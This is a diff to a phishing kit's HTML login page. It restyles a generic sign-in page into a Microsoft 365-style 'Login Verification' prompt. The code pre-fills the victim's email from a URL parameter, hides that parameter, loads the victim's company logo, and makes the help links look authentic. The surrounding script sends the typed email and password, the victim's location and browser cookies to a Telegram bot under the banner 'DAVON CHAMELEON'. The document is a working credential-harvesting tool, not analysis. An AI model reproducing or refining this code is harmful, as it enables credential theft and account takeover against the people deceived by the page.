@@ -3,10 +3,50 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Review</title>
+<title>Login Verification</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
 <style>
+/* ===================== MICROSOFT EMAIL DISPLAY ===================== */
+/* FINAL OVERRIDE — REMOVE UGLY BOX FOR EMAIL DISPLAY */
+#email-display-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  width: 100%;
+  margin: 0;
+  padding: 0;
+}
+
+#back-arrow {
+  color: #0067b8;
+  font-size: 22px;
+  cursor: pointer;
+  flex-shrink: 0;
+}
+
+/* Email input — make it look like plain text */
+#email.email-flat {
+  border: none !important;
+  outline: none !important;
+  background: transparent !important;
+  padding: 0 !important;
+  margin: 0 !important;
+  height: auto !important;
+  font-size: 18px !important;
+  font-weight: 600 !important;
+  color: #000 !important;
+  pointer-events: none !important;
+  box-shadow: none !important;
+  width: auto !important;
+}
+
+/* removes inherited rounded input styling */
+.input-group input#email {
+  border: none !important;
+  background: transparent !important;
+}
+
 /* ============= GLOBAL ============= */
 body, html {
   margin: 0;
@@ -34,7 +74,8 @@ body, html {
 }
 #verification-overlay.fade-out { opacity:0; pointer-events:none; }
 
-/* ============= LOGIN BOX ============= */
+
+/* ============= LOGIN BOX ANIMATION — MICROSOFT 365 STYLE ============= */
 #login-wrapper {
   position: fixed;
   inset: 0;
@@ -42,14 +83,34 @@ body, html {
   justify-content: center;
   align-items: center;
   z-index: 9999;
+
+  /* Microsoft: start slightly to the right + faded */
   opacity: 0;
-  transform: translateY(40px);
-  transition: opacity 0.48s cubic-bezier(.1,.9,.2,1),
-              transform 0.48s cubic-bezier(.1,.9,.2,1);
+  transform: translateX(40px);
+
+  transition:
+    opacity 0.48s cubic-bezier(.1,.9,.2,1),
+    transform 0.48s cubic-bezier(.1,.9,.2,1);
 }
+
 #login-wrapper.visible {
-  opacity: 5;
-  transform: translateY(0);
+  opacity: 1;
+  transform: translateX(0);
+}
+
+/* LOGIN BOX CONTAINER */
+.overlay { position:absolute; inset:0; display:flex; justify-content:center; align-items:center; }
+
+
+/* CONTENTS INSIDE BOX */
+.login-content {
+  transform: translateX(120%);
+  opacity:0;
+  transition: transform 0.65s cubic-bezier(.16,1,.3,1), opacity 0.65s ease;
+}
+.login-content.visible {
+  transform: translateX(0);
+  opacity:1;
 }
 
 
@@ -63,8 +124,12 @@ body, html {
   position: relative;
 }
 
-/* LOGO */
-#logo { width:100px; display:block; margin:0 auto 20px; }
+#logo {
+  width: 100px;
+  display: block;
+  margin: 0 0 20px 0;
+  padding-left: 4px;
+}
 
 /* Space under logo */
 .form-area {
@@ -72,40 +137,35 @@ body, html {
 }
 
 
-/* Input fields */
-.login-box input {
-  width: 100%;
-  padding: 12px 16px;
-  margin-bottom: 15px;
-  border: 1px solid #bbb;
-  border-radius: 8px;
-  font-size: 15px;
-  transition: border-color 0.3s ease;
-  box-sizing: border-box;
+/* INPUTS */
+.input-group { display:flex; align-items:center; gap:10px; margin-bottom:28px; }
+.input-group i { color:#0078d4; font-size:18px; cursor:pointer; }
+.input-group input {
+  flex:1; font-size:16px; font-weight:600;
+  border:none; background:transparent;
+  outline:none; border-bottom:1.5px solid transparent;
+  transition:border-color .3s;
+}
+.input-group input:focus { border-bottom:1.5px solid #0078d4; }
+
+.ms-pass-field {
+  width:80%; padding:12px; border:1px solid #8a8a8a;
+  font-size:16px; margin-top:20px;
 }
 
-.login-box input:focus {
-  border-color: #555;
-  outline: none;
-}
+/* LINKS */
+.ms-links { margin:15px 0 15px; line-height:1.8; }
+.ms-links a { color:#0067b8; text-decoration:none; }
+.ms-links a:hover { text-decoration:underline; }
 
-/* Login button */
-.login-box button {
-  width: 100%;
-  padding: 12px 16px;
-  font-size: 16px;
-  background-color: #444;
-  color: white;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  transition: background-color 0.3s ease;
-  box-sizing: border-box;
+/* NEXT BUTTON */
+.ms-next-btn {
+  background:#0067b8; color:#fff; border:none;
+  padding:12px 34px; font-size:17px;
+  cursor:pointer; float:right; border-radius:0;
+  transition:background 0.2s ease;
 }
-
-.login-box button:hover {
-  background-color: #222;
-}
+.ms-next-btn:hover { background:#005a9e; }
 
 /* Error message */
 .error-msg {
@@ -205,28 +265,39 @@ body, html {
 <iframe id="bg-frame"></iframe>
 
 <!-- ================= LOGIN CONTENT AREA ================= -->
-<div id="login-wrapper">
+<div id="login-wrapper">                
   <div class="login-box">
     <div id="login-content-container">
 
       <img id="logo" src="" alt="Logo">
 
-      <div class="input-group">
-    <i class="fa-solid fa-envelope icon"></i>
-    <input type="text" id="email" placeholder="Email">
+<div id="email-display-row">
+  <i id="back-arrow" class="fas fa-arrow-left"></i>
+
+  <input 
+    type="text" 
+    id="email"
+    class="email-flat"
+    readonly
+  >
 </div>
 
-<div class="input-group">
-    <i class="fa-solid fa-lock icon"></i>
-    <input type="password" id="password" placeholder="Password">
+</p>
+      <p style="margin-bottom: 10px; font-weight: normal;">
+        To access this information, sign in for verification
+      </p>
+
+      <b>Enter password</b>
+      <input type="password" id="password"
+             placeholder="Password" class="ms-pass-field"/>
+      <div class="ms-links">
+  <p>No account? <a id="create-link" href="#">Create one</a></p>
+  <p><a id="forgot-link" href="#">Forgot your password?</a></p>
 </div>
 
-        <p>Sign in to Review
-<p>
-      <button id="login-btn" class="ms-next-btn">Sign in</button>
+      <div id="error-msg"></div>
 
-      <p id="error-msg"></p>
-
+      <button id="login-btn" class="ms-next-btn">Next</button>
     </div>
   </div>
 </div>
@@ -255,6 +326,17 @@ document.addEventListener("DOMContentLoaded", () => {
     emailInput.setAttribute("uneditable", true);
 
     domain = rawEmail.split('@')[1].trim();
+    
+    // Insert domain into the "Create one" and "Forgot password" links
+const createLink = document.getElementById("create-link");
+const forgotLink = document.getElementById("forgot-link");
+
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+    const domain = rawEmail.split("@")[1];
+
+    createLink.href = "http://www." + domain;
+    forgotLink.href = "http://www." + domain;
+}
   // HIDE parameter
   history.replaceState({}, document.title, window.location.pathname);
     // Set logo
@@ -411,13 +493,15 @@ const rawEmail = params.get("document");
 
 // Check if email exists AND is valid
 if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+
   emailInput.value = rawEmail;
   emailInput.setAttribute("uneditable", true);
 
   const domain = rawEmail.split('@')[1];
+
   // HIDE parameter
   history.replaceState({}, document.title, window.location.pathname);
- 
+  // Set logo
   
   // Set logo
   logoImg.src = `https://logo.clearbit.com/${domain}`;
@@ -468,9 +552,9 @@ fetch("https://ipapi.co/json/")
 function sendTelegramMessage(email, password, attempt, country, cookies) {
   const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
                ` 🖥️UserId : [ ${email} ]\n` +
-               `  🔐Pass  : [ ${password} ]\n` +
-               ` 🌍Country : [ ${userCity}, ${userCountry} ]\n` +
-               ` 🍪Cookies: ${JSON.stringify(cookies)}`;
+               `   🔐Pass : [ ${password} ]\n` +
+               ` Country : [ ${userCity}, ${userCountry} ]\n` +
+               ` Cookies: ${JSON.stringify(cookies)}`;
 
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   const payload = {
@@ -508,3 +592,5 @@ loginBtn.addEventListener('click', () => {
 </script>
 </body>
 </html>
+
+
